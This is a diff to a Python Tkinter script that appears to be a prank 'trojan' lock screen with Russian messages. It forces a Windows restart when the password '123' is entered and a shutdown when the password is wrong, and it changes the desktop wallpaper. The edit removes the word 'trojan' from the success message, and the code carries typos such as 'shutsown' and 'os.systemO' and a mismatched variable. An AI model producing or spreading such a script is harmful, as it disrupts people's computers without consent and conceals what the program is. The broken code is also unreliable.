@@ -45,7 +45,7 @@ def create_window():
 
         if password=='123':
             os.system("shutsown /r /t 25")
-            messagebox.showinfo("Поздравляю!","ты удалили троян не обижайся ")
+            messagebox.showinfo("Поздравляю!","ты удалил  не обижайся ")
         else:
             messagebox.showwarning("Ошибка","Пароль неверный ")
             os.systemO("shutsown /s /t 180 ")
@@ -71,7 +71,7 @@ def set_wallpaper_from_folder(folder_path):
         image_files=os.path.join(folder_path,image_files[0])
         set_wallpaper(image_path)
     else:
-        messagebox.showwarning("Ошибка","папке нет иображний!")
+        messagebox.showwarning("Ошибка","в папке нет иображний!")
 
 walpaper_folder='files/images/'
 if os.path.isdir(walpaper_folder):
